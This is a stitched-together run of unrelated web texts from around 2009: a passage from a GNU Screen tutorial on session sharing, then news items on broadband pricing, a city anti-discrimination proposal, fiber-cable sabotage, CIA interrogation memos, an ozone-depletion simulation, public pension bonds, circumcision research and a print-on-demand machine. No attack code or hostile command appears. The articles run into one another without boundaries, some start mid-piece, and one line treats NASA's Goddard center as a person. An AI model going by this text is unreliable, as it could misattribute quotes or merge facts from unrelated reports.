Remote $ screen -t ghost Ghost $ screen -t new New $ ... Press Control - a d to detach ...
Remote $ screen -r - p ghost Ghost $ Show more Show more icon
You can log the output of every window with screen - L .
Each window has its own log file , typically named ~/ screenlog .
n , where n is the window number shown in the window menu .
This is another fantastic feature to record complex steps — say , when a system is being reconfigured .
See the Screen documentation for a complete list of accelerator keys .
Some of the most useful combinations are Ctrl - a , then 0 ( the digit zero ) through Ctrl -a , then 9 to switch immediately to a specific window ; Ctrl - a , then C ( uppercase C for “ Clear ” ) clears a window ; Ctrl -a , then H toggles logging on and off ; Ctrl -a , then Ctrl - a flip - flops between the current window and the previous window ; and Ctrl- a , then Ctrl -\ ( the backslash ) kills all windows and terminates the current Screen session .
Advanced use of Screen
As mentioned earlier , you can create multiple , concurrent Screen sessions , where each session can manage a suite of windows .
Each session has a unique identifier ; use ** screen - list ** to catalog all available sessions .
As with a window , you can name a session to refer to by its handle .
Use ** screen - S _label_ ** to assign a label to the new session .
Sharing is one of the best uses of a named Screen session .
If permitted , you can connect to an existing session and collaborate with other users within any of the session ’s windows .
You can even switch to another window within the session independently !
If you ’re in the same window as another , anything typed or displayed is reflected to all partners .
Let ’s try it :
Choose a machine to work on , and log in .
Type ** screen - S sharing -t one >** to create a new Screen session named , aptly , sharing , and a new window named one .
Create a second window with ** screen -t two ** .
If you like , check your work with Ctrl - a , then d , ** screen - list * * , ** screen -r sharing ** , and Ctrl - a , then “ .
Emit some output in the window named one by typing ** echo * * in that window .
On the same machine , open a second login window .
Within that window , type ** screen -x -r sharing - p one ** .
The -x option specifies multi-user mode ; -p one attaches directly to the window named one .
You should immediately see the same output as the other login session , as shown in Figure 9 .
Figure 9 .
A session can be shared
Using each login window , run UNIX ® commands to produce output , click Screen keyboard shortcuts to switch among the windows in the shared session , and watch the results .
Magic Screen
To delve further into Screen , read about split - screen mode and learn how you can prevent access to individual windows with an old - fashioned lock .
Screen is a remarkable tool that you will quickly find invaluable in any work you perform on the command line .
In fact , use it once , and you will wonder how you ever lived without it .
Technology.am ( Apr. 28 , 2009 ) — Cablevision Systems Corp. will start offering the fastest home Internet service available from any cable or phone company in the United States next month .
Cablevision has announced today that they will be offering all 3 million of their subscribers the option to upgrade to much speedier new DOCSIS 3.0 cable Internet , offering download speeds of 101 Mbps and upload speeds of 15 Mbps for a cost of $ 99.95 per month .
Cablevision , the Bethpage , N.Y. - based cable and Internet service provider plans to roll out the service across its entire market starting May 11 to all 5 million of the people in areas served by Cablevision , mainly in the New York City suburbs .
The company also plans to double the downstream speed of its Wi -Fi Internet service up to 3 Mbps for free .
Cablevision offers wireless Internet at several Wi -Fi hotspots in New York ’s Long Island , Connecticut and Westchester service areas , and in parts of New Jersey .
Cablevision is deploying a new technology called Docsis 3 which can utilize more of the capacity of a cable television system for data , offering both higher capacity and lower costs .
A Lawrence group is asking the city to change its anti-discrimination law to protect people who consider themselves transgender .
The Lawrence - Douglas County Chapter of the Kansas Equality Coalition has sent a letter asking commissioners to include transgender protection as part of the city ’s human rights ordinance .
The change would make it illegal for landlords and employers to deny someone housing or a job based on their transgender identity .
“ They deserve this , ” Maggie Childs , chair of the coalition , said of the proposed legal protection .
“ It is just clear to me that this is a very vulnerable group . ”
Merriam - Webster Dictionary defines “ transgender ” as “ having personal characteristics ( as transsexuality or transvestism ) that transcend traditional gender boundaries and corresponding sexual norms . ”
City commissioners are expected to officially receive the letter at their meeting on Tuesday evening .
Commissioners , though , are not expected to debate the proposal .
Instead , they plan to send the issue to the city ’s Human Relations Commission for a recommendation .
The issue likely wo n’t come back to the commission until after the April 7 City Commission elections .
There will be some opposition to the change , said the Rev. Leo Barbee , pastor of Victory Bible Church in Lawrence .
Barbee said that transgender individuals are engaging in deviant and sinful behavior , and that landlords and employers should be allowed to judge people on their behavior .
“ They are saying that this is my lifestyle , and I ’m going to make you accept it regardless , ” said Barbee , who has come out in opposition to previous Lawrence issues regarding homosexual rights .
“ I think a person has a right to say no .
I do n’t agree with your lifestyle , and I ’m not mandated to accept it . ”
Childs said people who are transgender generally do n’t consider it to be a lifestyle choice .
“ When they talk about transitioning , they talk about how that is the first time their outside has felt in sync with their inside , ” Childs said .
“ They do n’t talk about it as a choice . ”
The city ’s human rights ordinance already is unique in the state .
Since the mid-1990s , Lawrence has been the only city in the state where it is illegal to discriminate against a person on the basis of sexual orientation .
Lawrence also became the first city in the state to create a domestic partnership registry that gives some legal recognition to same - sex couples .
That registry was created in 2007 after the Kansas Equality Coalition lobbied for it .
Childs said recent research indicates that 108 cities or counties across the country have anti-discrimination laws that protect transgender people .
Those include : Kansas City , Mo. ; Boulder , Colo. ; Champaign , Ill. ; Austin , Texas ; and Iowa City , Iowa , according to information from the National Gay and Lesbian Task Force .
Childs said she was n’t aware of any publicized incidents of discrimination or hate crimes against transgender people in Lawrence .
But the coalition ’s letter points to a 1993 murder — the subject of the film “ Boys Do n’t Cry ” in Lincoln , Neb .
It also points to a 2007 case in Florida where a city manager was fired after transitioning from a male to a female .
“ It is not that we ’ve had a spate of problems in Lawrence , but we would rather be proactive and encourage awareness and acceptance before we have a tragedy , ” Childs said .
Groups that may be required to abide by the new law generally were just learning of it for the first time on Friday .
Matt Hoy , an attorney for the Lawrence Apartment Association , said his group would study the proposal .
“ Our members will want to thoughtfully review it , ” Hoy said .

AT&T has increased its reward to $ 250,000 for information leading to the arrest and conviction of those responsible for cutting fiber - optics lines at four locations early Thursday morning in South San Jose and San Carlos .
The sabotage led to widespread disruption of phone service — including land lands , some cell service , Internet access and 911 emergency service — in southern Santa Clara County as well as in Santa Cruz and San Benito counties .
Service was completely restored by the wee hours Friday morning .
“ We have zero tolerance for any criminal who would attack our network and harm customers , ” AT&T spokesman John Britton said .
“ We ’re going to aggressively work with law enforcement to see those responsible are apprehended and prosecuted to the fullest extent of the law . ”
Police today are continuing their investigation into who deliberately cut fiber - optic cables in two underground locations in San Jose and two more in San Carlos around 1:30 a.m.
Thursday in an apparent coordinated act of sabotage .
The FBI is helping with the investigation .
Crews in South San Jose spent Thursday fusing four separate cable lines back together , some working eight feet deep in a manhole at Monterey Highway and Blossom Hill Road and others working with the pulled slack above ground , a few feet from a sign that said in red letters , “ Warning : Buried Fiber Optic Cable in This Vicinity .
Call Before You Dig . ” Nearby , authorities later discovered more cut cable lines at Hayes Avenue and Cottle Road , ﻿ which affected several hundred customers in the Hellyer , Silver Creek Valley and Tures neighborhoods .
Cables were also severed at two locations in San Carlos , but no disruption of service was detected .
Authorities believe all four incidents are related .
AT&T , whose cable lines leased to Verizon were cut , initially offered a $ 100,000 reward for information leading to the arrest and conviction of those responsible .
Britton said that amount was the largest reward in his 17 years with the company .

Whenever I buy anything online , I always dread that they will mail it with UPS .
There are lots of ways in which UPS sucks -- from refusing to leave packages by the door , even when you ask them in writing , using their own form for such things , .. to charging exorbitant rates for doing you the service of paying customs charges for your package when it crosses the border .
I can rant forever , but that 's not what this post is about .
I wanted to see if other people shared my opinion of UPS , so I went to upssucks.com , only to find that the site does not exist .
I could n't believe it !
Has UPS been picking on me alone all this time ?
Is everyone else a happy customer ?
Have they not yet annoyed anyone enough to make it worth the $ 10 it costs to register a domain name ?
So I ran a WHOIS query on the upssucks.com domain name , and it is indeed registered .
Guess by whom .
By " United Parcel Service at 340 MacArthur Blvd in Mahwah , NJ 07430 " .
They know that they suck !
In fact , back in 1997 , they anticipated that they would suck , so they paid the $ 70 it cost back then to register the domain name .
And they have been paying the fees to maintain possession of the domain name ever since .
It 's interesting to note that ups.com itself has been registered since 1992 .
So either UPS did n't suck for its first 5 years , or they just did n't know that they sucked .
United Parcel Service are also the proud owners of such prime internet real estate as upsblows.com and ihateups.com .
That 's some confidence in your service !
Well done , UPS .

A monster truck show promoter , who days earlier touted his event 's safety record , died after being crushed by one of the trucks during a show in Madison , Wisconsin , Saturday night .
A promoter 's death was the second fatality at a monster truck event in just over a week .
George Eisenhart 's death was the second fatality at a monster truck event in just over a week .
" Saturday 's incident , which is an uncommon occurrence , ... was a freak accident , " Dane County Sheriff Dave Mahoney said Sunday .
" Review of the incident shows that George [ Eisenhart ] accidentally stepped in front of a moving vehicle in a fashion that did not provide the vehicle 's driver adequate time to react , " said a statement from the Monster Truck Racing Association .
" All of us at the MTRA send our deepest condolences to the Eisenhart family and all the parties involved .
We are deeply saddened by the loss of our friend . "
Watch fan reaction to the accident »
Eisenhart , 41 , died eight days after a 6 - year - old boy was killed by flying debris at a monster truck show in Tacoma , Washington .
The shows were staged by different promoters .
Ironically , Eisenhart talked about the safety of his shows , put on by Monster Truck Nationals , in an interview with a Madison television station before the weekend event .
" This is our 16th year , " Eisenhart told CNN affiliate WKOW .
" I wish I had a big piece of wood to knock on right now , but we have not had an incident besides a gal slipping in the aisleway at another location . "

There has been a big rise in the number of foreigners learning Chinese , but still too few are studying the language , officials said on Thursday , worried this may affect efforts to soften China ’s global image .

China began setting up Confucius Institutes in 2004 to teach Chinese and they are now in 81 countries , but efforts to expand them are being hampered by too few teachers and poor teaching materials .
“ At present , the basis for the studying or teaching of Chinese is very weak , unlike for English , French or Spanish , which have been popularized for hundreds of years , ” said Xu Lin , director of the Confucius Institute Headquarters .
Xu , speaking to reporters on the sidelines of China ’s annual meeting of parliament , said that in the United States more students studied Latin at middle school than Chinese .
“ Though the desire to learn Chinese is very high , there is a lack of teachers and teaching materials , ” she added , referring specifically to the Confucius Institute .
“ Our teachers and teaching materials are not really appropriate for what ’s demanded of them overseas . ”
Still , the number of foreigners learning Chinese around the world now stood at about 40 million , Xu said .
China originally planned to have more than 100 Confucius Institutes worldwide by 2008 , but by the end of last year already had more than 250 , such is the demand .
Ironically , China ’s ruling Communist Party once condemned the ancient philosopher Confucius after whom the institute is named , and tried to eradicate the principles he taught , such as loyalty to family and tradition , saying they were “ reactionary . ”
But the government has begun reviving some old practices , including promoting certain aspects of Confucianism , as the Party seeks to make traditional virtues an anchor of order and stability during times of social change .
Zhu Chongshi , president of Xiamen University in southeastern China , said promoting Chinese language and culture globally would be good for the country ’s image .
“ What is soft power ?
The best soft power is to let people know you , understand you , love you . ” he said .
“ Less than one percent of U.S. students study Chinese .
With a situation like that , it ’s impossible for China to raise its soft power . ”
“ Setting up Confucius Institutes can have a huge effect on promoting understanding between China and the world .
It will help the people of the world objectively , fully and properly know China ’s people and culture , ” he said .
“ This is the best path to show China ’s soft power . ”
LONDON ( Reuters ) - A couple who falsely claimed 43,000 pounds of welfare benefits while sailing around the world were jailed on Friday after their scam was revealed on an internet blog website .
Shashi Bacheta and Jeffrey Cole are seen in this undated handout photo .
REUTERS / Handout/DWP
Shashi Bacheta , 52 , was imprisoned for 21 months after admitting 16 counts of benefit cheating over a five - year period including fraudulently claiming housing and council tax benefit .
Her partner , Jeffrey Cole , 58 , was given a 9 - month sentence after admitting four charges including receiving cash by deception and false accounting .
Bacheta had claimed she was too ill even to walk while she was scuba diving in Kenya and planning further trips on Cole ’s 100,000 pound yacht , “ The Kismet . ”
Their scheme was exposed when investigators from the Department for Work and Pensions working with Swansea Council found photos of the couple on the yacht on the internet blog site smugmug.com .
Bacheta had claimed she was living alone with her three children even though she had moved in with Cole in Swansea , the Press Association reported .
She also claimed for a disability allowance for mental problems and depression , later elaborating the fraud so she received the highest level of benefit , reserved for those housebound and unable to walk .
Judge Huw Davies at Swansea Crown Court told Bacheta she seemed to have made an application for “ every form of benefit you considered it possible to make a false representation about . ”
Cole , who owned a post office business and bought the yacht with an inheritance , was given a shorter sentence as he had claimed just 13,000 pounds of the benefit scam .
“ You were at the helm in a very real sense and set off to enjoy not only your own wealth but such money as you managed to get from public funds , ” Davies told him .
Bacheta ’s 28 - year - old daughter Anju was fined 500 pounds after admitting fraudulently several hundred pounds for being her mother ’s carer .

By Michael Isikoff and Mark Hosenball , NEWSWEEK – Over objections from the U.S. intelligence community , the White House is moving to declassify “ and publicly release ” three internal memos that will lay out , for the first time , details of the “ enhanced ” interrogation techniques approved by the Bush administration for use against “ high value ” Qaeda detainees .
The memos , written by Justice Department lawyers in May 2005 , provide the legal rationale for waterboarding , head slapping and other rough tactics used by the CIA .
One senior Obama official , who like others interviewed for this story requested anonymity because of the issue ’s sensitivity , said the memos were “ ugly ” and could embarrass the CIA .
Other officials predicted they would fuel demands for a “ truth commission ” on torture .
Because of an executive order signed by President Obama on Jan. 22 banning such aggressive tactics , deputies to Attorney General Eric Holder Jr. concluded there was no longer any reason to keep the interrogation memos classified .
But current and former intel officials pushed back , arguing that any public release might still compromise “ sources and methods . ”
According to the administration official , ex-CIA director Michael Hayden was “ furious ” about the prospect of disclosure and tried to intervene directly with Obama officials .
But the White House has sided with Holder .
Faced with a court deadline in a Freedom of Information
Act lawsuit regarding the memos filed by the ACLU , Justice lawyers asked for a two - week extension “ because the memoranda are being reviewed for possible release . ”
( White House , Justice and CIA spokesmen all declined to comment . )
The debate about torture ramped up again last week with an account in the New York Review of Books about a secret International Red Cross report that was delivered to the CIA in February 2007 .
The report , according to journalist Mark Danner , quotes detainees describing , often in gruesome detail , how they were locked in coffin - size boxes ; swung by towels around their necks into plywood walls ; and forced to stand naked for days while their arms were shackled above their heads .
“ I now know we were not fully and completely briefed on the CIA program , ” Senate Intelligence Committee chairwoman Dianne Feinstein told NEWSWEEK .
A U.S. official disputed the charge , claiming that members of Congress received more than 30 briefings over the life of the CIA program and that Congressional intel panels had seen the Red Cross report .
But the CIA insisted that the report be treated as if it had higher than top - secret classification , precluding any public discussion of its contents .
That ’s why declassification of the memos is significant , administration officials say : it would remove , at long last , the veil of secrecy about how detainees in the war on terror were actually treated .

As it tries to navigate a perilous economy , the social news site Digg is cutting back its staff and making a mad dash for the land of financial safety : profitability .
The San Francisco company announced on Thursday that it would cut 10 percent of its 75 - person work force and refocus on building an advertising infrastructure that will help it to get to profitability in 2009 .
Thus far , the company has depended on an advertising relationship with Microsoft for most of its revenues .
Now it hopes to supplement that income with targeted advertising it can sell itself .
Just four months ago , Digg raised $ 28 million in a venture capital round and announced plans to expand globally and translate the site into other languages .
Those plans are now on hold , as are Digg ’s anticipated move to larger offices .
“ We need to start investing in areas that could counteract what looks to be a pretty bad economic climate this year , ” said Jay Adelson , Digg ’s chief executive .
“ The answer to having a high value is profitability as soon as possible .
It ’s not about phantom valuations , it ’s about proving yourself with your revenues . ”
The company will also focus on expanding its relationship with its publishing partners ( which include The New York Times ) and on completing its much - anticipated integration with Facebook Connect in the next two months .
Mr. Adelson addressed the possibility that Digg may be in danger of being eclipsed by Twitter , the microblogging service that also allows people to serendipitously discover news items they might not have otherwise encountered .
Hitwise , the online measurement firm , posted data this week that showed Twitter was catching up to Digg in traffic .
But Mr. Adelson said he did not believe the companies competed .
Instead , he said , they can be used somewhat harmoniously .

Irish Company Creates World 's Most Efficient Solar Hot Water Panel
February 6th , 2009 by Ariel Schwartz
An Irish company called Surface Power has launched what it claims is the world ’s most efficient solar hot water panel .
Certification by testing house TUV Rhineland has shown that the innovative product is up to 131 % more efficient in morning and evening time and 76 % more efficient at midday than other panels .
Surface Power also believes its product could reduce domestic and commercial hot water bills by up to 70 % .
While the company ’s panel was designed specifically for the retrofit market , it is also suitable for new installations .
So far , the solar hot water panel is a big hit .
“ “ We received over 400 inquiries from the US alone last month after the specifications were released during the Christmas period .
We also expect the international home renovation market to be very strong during the next three years , as our collector is the only pre-packaged vacuum collector on the world market , ” said John Quinn , the company ’s founder .
Surface Power will create 20 new jobs over the next 12 months in anticipation of international distribution for its solar panel .

" I could see lots of police officers and I was shouting " Help , Help " , but no one came .
I was involved in this fantasy world .
It must have been the hallucinations that kept me going . "
The Balcons de Barcelona is a mural of 450 m2 on a dividing wall of a building , where by means of the technique of trompe - l’oeil , it imagines a group of outstanding personalities in the life of the city at different times from his history such as Joaquim Blume , Cristóbal Colón , Santiago Rusiñol , Joan Miró , Pablo Picasso , and many others .
It was created in 1992 .

The Haskell Hackathon last weekend was a great success with more than 50 people attending over the three days .
Thanks to the sponsors and local organisers !
If you 've been to a few of these events you learn that it 's best not to come with too many preconceived ideas for what to work on .
Since the point of the hackathon is really collaboration , you end up spending half the time talking and the other half working on cool ideas that other people bring .
I arrived with the general plan to work on the Haskell Platform release , and along with Don Stewart and Lennart Kolmodin we did actually get a bit done .
I 'm slightly embarrassed to admit that I spent three days at the Haskell Hackathon and wrote no Haskell code , only POSIX shell script and M4 autoconf macros !
Don and I updated the list of packages that will be in the first platform release .
There were a few that needed to be bumped after the ghc - 6.10.2 release .
Our thanks to Ross who had already uploaded all the core and " extra libs " packages to Hackage .
The three of us also worked on making a generic Unix tarball of the platform .
The point is for users of distros which do not yet have native packages for the platform to be able to download this tarball and ./ configure ; make ; make install .
We even managed to get something working just enough for people to be able to test it ( haskell - platform-2009.0.0.tar.gz ) .
Chris Eidhof and Eelco Lempsink of Tupil designed a cool " Get Haskell " download page
( The silly caption was Chris 's joke in response to Ganesh 's comment about an earlier design )
The idea is that we would put this at http://haskell.org/download/ to provide an easy start for new users .
For OSX and Windows , the icons would link directly to a download and a page with install and post - install instructions .
The Linux icon would link to another page with instructions for each supported distro , or the generic tarball for unsupported distros .
Outside of the Hackathon people have also been working hard on the platform release .
If you 're on the mailing list you 'll know that Mikhail Glushenkov has been making great progress on preparing a Windows installer .
He 's got a beta version available ( HaskellPlatform-2009.0.0-setup.exe ) .
Report feedback in the platform trac ticket # 6 .
Gregory Collins has also been working hard on a cabal2 macpkg tool to generate OSX packages from Cabal packages .
He 'll use this for each package in the platform and then bundle them all together ( along with ghc ) into one installer .
He 's been having difficulty with the fact that the package format for OSX Leopard is woefully under - documented .
If you 're someone who prepares distro packages then now is an excellent time to get started making sure you 've got the correct versions of all the platform packages and making a haskell - platform meta - package .
See the platform trac for more details .
Simulations of global ozone concentration show the real - world ozone layer ( left ) versus a " world avoided , " in which CFCs had never been banned .
Reds depict high concentration ; dark blues show low concentrations .
Note the seasonal pulse of ozone over the poles , how it declines to holes ( blue ) , then becomes global depletion by the 2050s .
2009 shown here .
If 193 nations had n’t agreed in 1989 to ban the chemicals that eat up the Earth ’s protective ozone layer , the world would have been a much different place later this century , with nearly two - thirds of the ozone layer gone and the ozone hole a permanent fixture over Antarctica , a new simulation shows .
Sunburns would occur in a matter of minutes and skin cancer - causing radiation would soar .
Ozone is the Earth 's natural sunscreen , absorbing and blocking most of the incoming ultraviolet ( UV ) radiation from the sun and protecting life from the DNA - damaging rays .
The gas is naturally created and replenished by a photochemical reaction in the upper atmosphere where UV rays break oxygen molecules ( O2 ) into individual atoms that then recombine into three - part molecules of ozone ( O3 ) .
As it is moved around the globe by upper level winds , ozone is slowly depleted by naturally occurring atmospheric gases .
It is a system in natural balance .
But chlorofluorocarbons ( CFCs ) — invented in 1928 as refrigerants and as inert , or non-reacting , carriers for chemical sprays — upset that balance .
Researchers discovered in the 1970s and 1980s that while CFCs are inert at Earth 's surface , they are quite reactive in the stratosphere ( 6 to 31 miles altitude , or 10 to 50 kilometers ) , where roughly 90 percent of the planet 's ozone accumulates .
UV radiation causes CFCs and similar bromine compounds in the stratosphere to break up into elemental chlorine and bromine that readily destroy ozone molecules .
Worst of all , such ozone depleting substances can reside for several decades in the stratosphere before breaking down .
In the 1980s , ozone - depleting substances opened a wintertime " hole " over Antarctica , which served as the impetus for the 1989 Montreal Protocol , which banned CFCs .
The United States signed on to the original Montreal Protocol agreement , as did many other countries , including China , India , Iran and Brazil .
" The regulation pre-supposed that a lack of action would lead to severe ozone depletion , with consequent severe increases of solar UV radiation levels at the Earth ’s surface , " said Paul Newman of NASA 's Goddard Space Flight Center in Greenbelt , Md .
Goddard and his colleagues used computer simulations to show " what might have been " if Montreal Protocol had never been put in place .
The team used a computer model that simulates the circulation of the Earth 's atmosphere and takes into account how changing levels of ozone affect that circulation .
They increased the emission of CFCs and similar compounds by 3 percent per year , a rate about half the growth rate for the early 1970s .
Then they let the simulated world evolve from 1975 to 2065 .
By the simulated year 2020 , 17 percent of all ozone is depleted globally , as assessed by a drop in Dobson Units ( DU ) , the unit of measurement used to quantify a given concentration of ozone .
An ozone hole starts to form each year over the Arctic , which was once a place of prodigious ozone levels .
By 2040 , in the scenario that is not actually happening , global ozone concentrations fall below 220 DU , the same levels that currently comprise the " hole " over Antarctica .
( In 1974 , globally averaged ozone was 315 DU . )
The UV index in mid-latitude cities reaches 15 around noon on a clear summer day ( a UV index of 10 is considered extreme today ) , giving a perceptible sunburn in about 10 minutes .
Over Antarctica , the ozone hole becomes a year - round fixture .
In the 2050s , ozone levels in the stratosphere over the tropics collapse to near zero in a process similar to the one that creates the Antarctic ozone hole .
By the end of the model run in 2065 , global ozone drops to 110 DU , a 67 percent drop from the 1970s .
Year - round polar values hover between 50 and 100 DU ( down from 300 to 500 in 1960 ) .
The intensity of UV radiation at Earth 's surface doubles ; at certain shorter wavelengths , intensity rises by as much as 10,000 times .
Skin cancer - causing radiation soars .
" We simulated a world avoided , " said Newman , " and it 's a world we should be glad we avoided . "
Some of the results of the simulation , detailed online in the journal Atmospheric Chemistry and Physics , were unexpected , even to the scientists on the team .
" Our ' world avoided ' calculation goes a little beyond what I thought would happen , " said Goddard scientist and study team member Richard Stolarski .
" The quantities may not be absolutely correct , but the basic results clearly indicate what could have happened to the atmosphere .
And models sometimes show you something you were n't expecting , like the precipitous drop in the tropics . "
The real world of CFC regulation has been somewhat kinder .
Production of ozone - depleting substances was mostly halted about 15 years ago , though their abundance is only beginning to decline because the chemicals can reside in the atmosphere for 50 to 100 years .
The peak abundance of CFCs in the atmosphere occurred around 2000 , and has decreased by roughly 4 percent to date .
Stratospheric ozone has been depleted by 5 to 6 percent at middle latitudes , but has somewhat rebounded in recent years .
The largest recorded Antarctic ozone hole was recorded in 2006 .
How Do You Build the World 's Biggest Wind Farm ?
March 23rd , 2009 by Ariel Schwartz
We recently learned that Denmark plans on building the world ’s largest wind farm .
With a net installed capacity of 209 MW , Horns Rev 2 ( companion to Horns Rev 1 ) will provide power to 200,000 homes .
The North Sea offshore wind farm is scheduled for completion later this year .

The so - called Principals who participated in the meetings also approved the use of " combined " interrogation techniques -- using different techniques during interrogations , instead of using one method at a time -- on terrorist suspects who proved difficult to break , sources said .
Highly placed sources said a handful of top advisers signed off on how the CIA would interrogate top al Qaeda suspects -- whether they would be slapped , pushed , deprived of sleep or subjected to simulated drowning , called waterboarding .
The high - level discussions about these " enhanced interrogation techniques " were so detailed , these sources said , some of the interrogation sessions were almost choreographed -- down to the number of times CIA agents could use a specific tactic .
The advisers were members of the National Security Council 's Principals Committee , a select group of senior officials who met frequently to advise President Bush on issues of national security policy .
At the time , the Principals Committee included Vice President Cheney , former National Security Advisor Condoleezza Rice , Defense Secretary Donald Rumsfeld and Secretary of State Colin Powell , as well as CIA Director George Tenet and Attorney General John Ashcroft .
As the national security adviser , Rice chaired the meetings , which took place in the White House Situation Room and were typically attended by most of the principals or their deputies .

BURLINGTON , Vt. - A man who bolted antlers to the head of a dead doe and posed for a photograph with the deer was fined $ 400 and jailed for game violations .
Marcel Fournier , 19 , shot the deer the evening of Nov. 22 and used lag bolts and epoxy to attach a 10 - point rack , officials said .
He then checked in the kill as lawful game at Barnie 's Market .
It 's illegal to kill an antlerless deer , and it 's also illegal to hunt at night .
The Concord resident admitted to the killing and led a game warden to the deer 's remains after an anonymous caller alerted authorities .
Fournier said he had " quite a time " drilling and fastening the antlers , authorities said .
Game warden David Gregory said the antlers did n't look or feel right .
" When you grabbed them , you 'd feel movement , " he said .
Col .
David LeCours , chief warden of the state Department of Fish and Wildlife , said the size of the antlers relative to the size of the deer seemed off .
" Something was n't natural about them , in addition to the fact that they were n't natural , " he said .
Fournier was sentenced to 10 days in jail Feb. 18 for taking a deer in a closed season .
He wo n't qualify for a state hunting , fishing or trapping license for at least three years .
LeCours said add - on antlers are the stuff of legend , but that it 's the first documented case of it in Vermont .
Go read the whole thing , if you have the stomach .
See , this is the whole thing about the Republican - dominated economic policies of the past three decades :
They just do n't work .
You can't magically make liabilities go away by deferring them , but God forbid these pants - wetting politicians should actually take a leadership position in favor of higher taxes now when it could save billions of dollars later !
Why , the scary Club for Growth might say " Boo ! " to them !
March 3 ( Bloomberg ) --
The Chicago Transit Authority retirement plan had a $ 1.5 billion hole in its stash of assets in 2007 .
At the height of a four - year bull market , it did n’t have enough cash on hand to pay its retirees through 2013 , meaning it was underfunded to the tune of 62 percent .
The CTA , which manages the second - largest public transit system in the U.S. , had to hope for a huge contribution from the Illinois state legislature .
That was n’t going to happen .
Then the authority found an answer .
“ We ’ve identified the problem and a solution , ” said CTA Chairman Carole Brown on April 16 , 2007 .
The agency decided to raise money from a bond sale .
A year later , it asked Illinois Auditor General William Holland to research its plan .
The state hired an actuary , did a study and , on July 17 , concluded that the sale of bonds would most likely result in a loss of taxpayers ’ money .
Thirteen days after that , the CTA ignored the warning and issued $ 1.9 billion in bonds .
Before the year ended , the pension fund was paying out more to bondholders than it was earning on its new influx of money .
Instead of closing its funding gap , the CTA was falling further behind .
Public pension funds across the U.S. are hiding the size of a crisis that ’s been looming for years .
Retirement plans play accounting games with numbers , giving the illusion that the funds are healthy .
The paper alchemy gives governors and legislators the easy choice to contribute too little or nothing to the funds , year after year .
The misleading numbers posted by retirement fund administrators help mask this reality : Public pensions in the U.S. had total liabilities of $ 2.9 trillion as of Dec. 16 , according to the Center for Retirement Research at Boston College .
Their total assets are about 30 percent less than that , at $ 2 trillion .
With stock market losses this year , public pensions in the U.S. are now underfunded by more than $ 1 trillion .
That lack of funds explains why dozens of retirement plans in the U.S. have issued more than $ 50 billion in pension obligation bonds during the past 25 years -- more than half of them since 1997 -- public records show .
The quick fix for pension funds becomes a future albatross for taxpayers .
[...]
By law , states must guarantee public pension fund debts .
“ What appears to be a riskless strategy is actually very risky , ” says David Zion , director of accounting research for New York - based Credit Suisse Holdings USA Inc .
“ If the returns on the pension bond - financed assets do n’t exceed the cost of servicing the debt , the taxpayers bear the brunt . ”
Circumcision cut the risk of infection with the herpes virus Circumcision should be routinely considered as a way to reduce the risk of sexually transmitted infections , argue US experts .
They spoke out after research found circumcision significantly cut the risk of infection with herpes and the cancer - causing human papillomavirus .
Circumcision is known to sharply reduce the risk of HIV infection .
But the study , featured in the New England Journal of Medicine , failed to convince UK experts .
All providers who care for pregnant women and infants have a responsibility to assure that mothers and fathers know that circumcision could help protect their sons
Dr Judith Wasserheit
University of Washington
The research , carried out by scientists in Uganda , involved nearly 3,500 men and monitored their sexual activity over a period of up to two years .
The researchers , from Johns Hopkins University , found circumcision reduced the risk of herpes by 25 % , and human papillomavirus ( HPV ) by a third .
HPV causes cervical cancer in women , and genital warts in both sexes .
Circumcision rates have been declining in the US and are lowest among black and Hispanic patients - the groups with the highest rates of HIV , herpes and cervical cancer .
Writing in the journal , Dr Matthew Golden and Dr Judith Wasserheit , from the University of Washington , said : " These new data should prompt a major reassessment of the role of male circumcision not only in HIV prevention but also in the prevention of other sexually transmitted infections . "
Dr Wasserheit went on to say : " All providers who care for pregnant women and infants have a responsibility to assure that mothers and fathers know that circumcision could help protect their sons from the three most common and most serious viral sexually transmitted infections , all of which cannot currently be cured . "
UK scepticism
The reason why a foreskin might increase the risk of infection with various viruses is unclear .
However , research has suggested that a man with a damp penis has a greater risk of being infected by HIV .
Various reasons for this have been put forward , including wetness allowing viruses to stick more easily to the penis , or creating tiny ulcers on the surface of the penis through which a virus might enter .
Dr Colm O'Mahony , a sexual health expert from the Countess of Chester Foundation Trust Hospital in Chester , said the US had an " obsession " with circumcision being the answer to controlling sexually transmitted infections .
He said : " Sure , a dry skinned penis is a bit less likely to contract HIV , herpes and possibly genital warts but it will get infected eventually . "
Dr O'Mahony also said pushing circumcision as a solution sent the wrong message .
" It suggests that it is women who infect innocent men - let 's protect the innocent men .
" And it allows men who do n't want to change their irresponsible behaviour to continue to sleep around and not even use a condom . "
Keith Alcorn , from the HIV information service NAM , also warned against a knee jerk reaction .
He said : " We have to be careful not to take evidence from one part of the world and apply it uncritically to others .
" Male circumcision will have little impact on HIV risk for boys born in the UK , where the risk of acquiring HIV heterosexually is very low .
" Girls can be vaccinated against HPV and so protected from cervical cancer , and condoms protect against herpes . "

It 's not elegant and it's not sexy – it looks like a large photocopier – but the Espresso Book Machine is being billed as the biggest change for the literary world since Gutenberg invented the printing press more than 500 years ago and made the mass production of books possible .
Launching today at Blackwell 's Charing Cross Road branch in London , the machine prints and binds books on demand in five minutes , while customers wait .
Signalling the end , says Blackwell , to the frustration of being told by a bookseller that a title is out of print , or not in stock , the Espresso offers access to almost half a million books , from a facsimile of Lewis Carroll 's original manuscript for Alice in Wonderland to Mrs Beeton 's Book of Needlework .
Blackwell hopes to increase this to over a million titles by the end of the summer – the equivalent of 23.6 miles of shelf space , or over 50 bookshops rolled into one .
The majority of these books are currently out - of - copyright works , but Blackwell is working with publishers throughout the UK to increase access to in - copyright writings , and says the response has been overwhelmingly positive .
" This could change bookselling fundamentally , " said Blackwell chief executive Andrew Hutchings .
" It 's giving the chance for smaller locations , independent booksellers , to have the opportunity to truly compete with big stock - holding shops and Amazon ... I like to think of it as the revitalisation of the local bookshop industry .
If you could walk into a local bookshop and have access to one million titles , that 's pretty compelling . "
From academics keen to purchase reproductions of rare manuscripts to wannabe novelists after a copy of their self - published novels , Blackwell believes the Espresso – a Time magazine " invention of the year " – can cater to a wide range of needs , and will be monitoring customer usage closely over the next few months as it looks to pin down pricing ( likely to be around the level of traditional books ) and demand .
It then hopes to roll it out across its 60 - store network , with its flagship Oxford branch likely to be an early recipient as well as a host of smaller , campus - based shops .
The brainchild of American publisher Jason Epstein , the Espresso was a star attraction at the London Book Fair this week , where it was on display to interested publishers .
Hordes were present to watch it click and whirr into action , printing over 100 pages a minute , clamping them into place , then binding , guillotining and spitting out the ( warm as toast ) finished article .
